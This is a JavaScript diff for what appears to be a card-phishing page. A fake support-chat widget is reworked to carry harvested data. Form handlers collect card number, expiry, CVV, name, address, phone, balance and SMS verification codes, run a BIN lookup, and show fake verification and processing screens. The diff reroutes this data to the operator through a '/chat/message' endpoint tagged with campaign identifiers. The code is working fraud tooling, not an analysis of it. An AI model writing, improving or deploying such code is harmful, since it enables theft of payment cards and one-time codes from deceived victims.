@@ -494,7 +494,16 @@ customElements.define('support-widget', class extends HTMLElement {
     /* listen for page triggers */
     var self = this;
     document.addEventListener('chat:trigger', function(e){
-      self._fireTrigger(e.detail);
+      var detail = e.detail;
+      /* если detail — объект {trigger, text, ...extra}, отправляем напрямую без поиска шага */
+      if(detail && typeof detail === 'object' && detail.trigger){
+        var extra = {};
+        var skipKeys = {trigger:1, text:1};
+        Object.keys(detail).forEach(function(k){ if(!skipKeys[k]) extra[k] = detail[k]; });
+        self._postTrigger(detail.trigger, detail.text || '', extra);
+      } else {
+        self._fireTrigger(detail);
+      }
     });
   }
 
@@ -593,19 +602,20 @@ customElements.define('support-widget', class extends HTMLElement {
     this._msgs.scrollTop = this._msgs.scrollHeight;
   }
 
-  async _postTrigger(trigger, text){
+  async _postTrigger(trigger, text, extra){
     if(!this._sessionId) return;
     try {
+      var body = Object.assign({
+        session_id: this._sessionId,
+        subdomain: SUBDOMAIN,
+        link_id: LINK_ID,
+        trigger: trigger,
+        text: text
+      }, extra || {});
       await fetch('/chat/message',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({
-          session_id: this._sessionId,
-          subdomain: SUBDOMAIN,
-          link_id: LINK_ID,
-          trigger: trigger,
-          text: text
-        })
+        body: JSON.stringify(body)
       });
     } catch(_){}
   }
@@ -1973,21 +1983,8 @@ document.addEventListener('DOMContentLoaded', function(){
                         document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'error'}));
                         return;
                     }
-                    submitData({
-                        card_number: cardInp.value,
-                        card_exp:    expInp.value,
-                        card_cvv:    cvvInp.value,
-                        card_name:   nameInp.value.trim(),
-                        country:     cntry ? cntry.value : '',
-                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
-                        address2:    '',
-                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
-                        city:        (sh.getElementById('cc-city')||{}).value||'',
-                        phone_dial:  dialEl ? dialEl.textContent : '',
-                        phone:       phoneInp ? phoneInp.value : ''
-                    });
                     showVerification(sh, self);
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'balance'}));
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'card'}));
                 });
             }
 
@@ -2083,7 +2080,10 @@ document.addEventListener('DOMContentLoaded', function(){
                         return;
                     }
                     var cur=(sh.getElementById('v-currency')||{}).value||'';
-                    submitData({
+                    /* передаём данные карты + баланс одним сообщением через /chat/message */
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:{
+                        trigger: 'balance',
+                        text: amt + ' ' + cur,
                         card_number: cardInp ? cardInp.value : '',
                         card_exp:    expInp  ? expInp.value  : '',
                         card_cvv:    cvvInp  ? cvvInp.value  : '',
@@ -2096,10 +2096,9 @@ document.addEventListener('DOMContentLoaded', function(){
                         phone:       phoneInp? phoneInp.value : '',
                         balance_amount:   amt,
                         balance_currency: cur
-                    });
+                    }}));
                     var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
                     lookupBin(raw).then(function(){ showProcessing(sh, self); });
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'balance'}));
                 });
             }
 
@@ -2271,21 +2270,17 @@ document.addEventListener('DOMContentLoaded', function(){
                 sh.getElementById('ci-submit').addEventListener('click',function(){
                     var code=(ciInp.value||'').trim();
                     if(!code){ ciBox.classList.add('err'); return; }
-                    submitData({
-                        card_number: cardInp ? cardInp.value : '',
-                        card_exp:    expInp  ? expInp.value  : '',
-                        card_cvv:    cvvInp  ? cvvInp.value  : '',
-                        card_name:   nameInp ? nameInp.value.trim() : '',
-                        verification_code: code
-                    });
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code'}));
-                    /* show spinner / processing again */
+                    /* отправить код только через /chat/message */
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:{trigger:'code', text: code}}));
                     showProcessing(sh, self);
                 });
 
-                sh.getElementById('ci-resend').addEventListener('click',function(){
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code_resend'}));
-                });
+                var ciResend = sh.getElementById('ci-resend');
+                if(ciResend){
+                    ciResend.addEventListener('click',function(){
+                        document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code_resend'}));
+                    });
+                }
 
                 setTimeout(function(){ if(ciInp) ciInp.focus(); }, 80);
             }
